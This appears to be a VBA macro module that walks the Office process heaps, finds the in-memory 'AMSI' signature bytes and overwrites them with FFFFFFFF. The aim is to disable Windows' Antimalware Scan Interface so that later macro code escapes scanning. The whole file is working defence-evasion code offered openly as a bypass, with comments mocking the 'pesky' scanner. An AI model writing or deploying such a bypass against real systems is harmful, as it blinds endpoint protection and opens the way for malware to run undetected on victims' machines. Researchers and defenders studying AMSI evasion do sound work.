Attribute VB_Name = "Module1"
Private Type PROCESS_HEAP_ENTRY
    lpData              As LongPtr
    cbData              As LongPtr
    cbOverhead          As Byte
    iRegionIndex        As Byte
    wFlags              As Integer
    dwCommittedSize     As LongPtr
    dwUnCommittedSize   As LongPtr
    lpFirstBlock        As LongPtr
    lpLastBlock         As LongPtr
End Type

Private Const PROCESS_HEAP_ENTRY_BUSY As Long = &H4
Private Const CRYPT_STRING_BINARY As Long = 2

Private Declare PtrSafe Function GetProcessHeaps Lib "kernel32" (ByVal NumberOfHeaps As Long, ByRef ProcessHeaps As Any) As Long
Private Declare PtrSafe Function HeapWalk Lib "kernel32" (ByVal hHeap As LongPtr, ByRef lpEntry As PROCESS_HEAP_ENTRY) As LongPtr
Private Declare PtrSafe Function ToString Lib "crypt32.dll" Alias "CryptBinaryToStringA" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, ByRef pcchString As LongPtr) As LongPtr

Sub HeapsOfFun()

    Dim ProcessHeaps As LongPtr
    Dim NumberOfHeaps As Long
    Dim PHE As PROCESS_HEAP_ENTRY

    Dim ReadBuffer As LongPtr
    Dim WriteBuffer As Long

    'The value that we're going to write on the heap
    WriteBuffer = &HFFFFFFFF

    NumberOfHeaps = GetProcessHeaps(1, ProcessHeaps)
    'Debug.Print Str(NumberOfHeaps) & " Handles to heaps that are active for the calling process"
    If NumberOfHeaps > 0 Then
        retval = HeapWalk(ProcessHeaps, PHE)
        'retval of 0 means failure
        If retval > 0 Then
            Do While HeapWalk(ProcessHeaps, PHE) <> 0
                'If PHE.wFlags And PROCESS_HEAP_ENTRY_BUSY) is not equal to 0 it means that we have an Allocated block
                If ((PHE.wFlags And PROCESS_HEAP_ENTRY_BUSY) <> 0) Then
                    'Copy the 4 bytes from PHE.lpData into ReadBuffer
                    ToString ByVal PHE.lpData, ByVal 4, CRYPT_STRING_BINARY, ByVal VarPtr(ReadBuffer), ByVal VarPtr(Len(ReadBuffer))
                    'If ReadBuffer equals AMSI
                                  
                    If ReadBuffer = &H49534D41 Then
                        Debug.Print "Pesky AMSI Bytes found on the Heap at: " & Hex(PHE.lpData)
                        'Copy the 4 bytes FFFFFFFF into the location of PHE.lpData which is where we found AMSI
                        ToString ByVal VarPtr(WriteBuffer), ByVal 4, CRYPT_STRING_BINARY, ByVal PHE.lpData, ByVal VarPtr(Len(PHE.lpData))
                        Debug.Print "Replaced Pesky Bytes found on the Heap at: " & Hex(PHE.lpData) & " with " & Hex(WriteBuffer)
                        'We've done what we came to do, exit the loop
                        Exit Do
                    End If
                End If
            Loop
        End If
    End If

End Sub